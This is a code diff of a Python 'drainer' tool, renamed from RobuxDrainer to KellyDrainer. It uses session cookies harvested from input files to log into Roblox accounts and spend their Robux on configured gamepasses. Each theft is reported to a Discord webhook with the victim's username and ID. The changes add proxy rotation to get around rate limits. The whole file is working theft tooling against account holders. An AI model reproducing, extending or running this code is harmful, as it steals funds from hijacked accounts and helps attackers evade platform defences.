@@ -8,6 +8,7 @@ from src.utils import (
 from src.roblox import RobloxSession, CsrfError
 from src.webhook import send_discord_webhook
 from src.bot import start_bot
+from src.proxy import load_proxies, get_next_proxy
 
 INPUT_DIR = "input"
 COOKIES_FILE = os.path.join(INPUT_DIR, "cookies.txt")
@@ -15,7 +16,6 @@ CONFIG_FILE = os.path.join(INPUT_DIR, "config.json")
 
 def scrape_input_folder():
     all_cookies = []
-    
     file_patterns = [
         os.path.join(INPUT_DIR, "robux*.txt"),
         os.path.join(INPUT_DIR, "rap*.txt")
@@ -27,7 +27,6 @@ def scrape_input_folder():
     
     for file in files_to_scrape:
         if "cookies.txt" in os.path.basename(file): continue
-        
         try:
             with open(file, "r", encoding="utf-8") as f:
                 for line in f:
@@ -41,7 +40,6 @@ def scrape_input_folder():
     if all_cookies:
         existing = load_cookies()
         unique_new = [c for c in all_cookies if c not in existing]
-        
         if unique_new:
             with open(COOKIES_FILE, "a", encoding="utf-8") as f:
                 for c in unique_new:
@@ -71,10 +69,14 @@ def main():
     config = load_config()
     gamepasses = sorted(config.get("gamepasses", []), key=lambda x: x['price'], reverse=True)
     
+    use_proxy = config.get("use_proxy", True)
+    proxy_list = load_proxies() if use_proxy else []
+    current_proxy = get_next_proxy(proxy_list) if use_proxy else None
+
     clear_console()
-    set_app_name("RobuxDrainer v1.3")
+    mode_text = "[Proxied]" if use_proxy else "[Proxyless]"
+    set_app_name(f"KellyDrainer {mode_text}")
     
-    # Start bot
     if config.get("bot_token"):
         threading.Thread(target=start_bot, args=(config["bot_token"],), daemon=True).start()
 
@@ -82,13 +84,13 @@ def main():
     update_cookie_count()
 
     cookies = load_cookies()
-    log("[+]", f"Loaded {len(cookies)} cookies total", BLUE)
+    log("[+]", f"Loaded {len(cookies)} cookies | {len(proxy_list)} proxies", BLUE)
 
     i = 0
     while i < len(cookies):
         cookie = cookies[i]
         try:
-            user = RobloxSession(cookie)
+            user = RobloxSession(cookie, proxies=current_proxy)
             balance = user.get_balance()
             log("[#]", f"{user.username} | Balance: {balance} R$", PURPLE)
 
@@ -99,50 +101,62 @@ def main():
                 update_cookie_count()
                 continue
 
-            for gp in gamepasses:
+            gp_idx = 0
+            while gp_idx < len(gamepasses):
+                gp = gamepasses[gp_idx]
                 gaid, price = gp["id"], gp["price"]
 
                 if balance >= price:
                     log("[...]", f"Buying: {price} R$", BLUE)
-
                     status_code, status_json = user.buy_gamepass(gaid)
-                    purchased = status_json.get("purchased", False) if isinstance(status_json, dict) else False
+                    
+                    purchased = False
+                    reason = "Unknown"
+                    if isinstance(status_json, dict):
+                        purchased = status_json.get("purchased", False)
+                        reason = status_json.get("reason", "None")
 
                     if purchased:
                         add_try()
                         add_robux(price)
                         balance -= price
-                        log("[✓]", f"Success! Bought {price} R$", GREEN)
+                        log("[✓]", f"Success! {user.username} bought {price} R$", GREEN)
 
-                        # ✅ SAFE WEBHOOK (FIX)
-                        webhook = config.get("webhook")
-                        if webhook and webhook.startswith("http"):
+                        webhook_url = config.get("webhook")
+                        if webhook_url and webhook_url.startswith("http"):
                             try:
                                 send_discord_webhook(
-                                    webhook,
-                                    user.username,
-                                    user.user_id,
-                                    gaid,
-                                    price,
-                                    status_code,
-                                    status_json,
-                                    "",
-                                    config.get("user_id")
+                                    webhook_url,            
+                                    user.username,      
+                                    user.user_id,         
+                                    gaid,                
+                                    price,              
+                                    status_code,          
+                                    status_json,         
+                                    "Success",          
+                                    config.get("user_id")  
                                 )
                             except Exception as e:
-                                log("[!]", f"Webhook error: {e}", RED)
+                                log("[!]", f"Webhook failed: {e}", RED)
 
-                        time.sleep(1)
-
+                        time.sleep(config.get("delay", 1))
                     else:
-                        reason = status_json.get("reason", "Unknown")
-
-                        if "Unknown" in reason:
-                            log("[!]", "RATELIMITED! Waiting 60s...", YELLOW)
-                            time.sleep(60)
-                            continue
+                        if status_code == 429 or "TooManyRequests" in reason:
+                            if use_proxy:
+                                log("[!]", "RATELIMITED! Swapping proxy...", YELLOW)
+                                current_proxy = get_next_proxy(proxy_list)
+                                user = RobloxSession(cookie, proxies=current_proxy) 
+                                time.sleep(1)
+                                continue 
+                            else:
+                                log("[!]", "RATELIMITED! waiting 60 seconds...", YELLOW)
+                                time.sleep(60)
+                                continue
                         else:
                             log("[x]", f"Failed: {reason}", RED)
+                            gp_idx += 1
+                else:
+                    gp_idx += 1
 
         except CsrfError:
             log("[!]", "Invalid cookie, removing...", RED)
@@ -150,15 +164,14 @@ def main():
             save_cookies(cookies)
             update_cookie_count()
             continue
-
         except Exception as e:
-            log("[!]", f"Error: {e}", RED)
+            log("[!]", f"Error processing cookie: {e}", RED)
             i += 1
             continue
 
         i += 1
         update_cookie_count()
-        time.sleep(config.get("delay", 5))
+        time.sleep(config.get("delay", 1))
 
     log("[+]", "Finished!", GREEN)
 
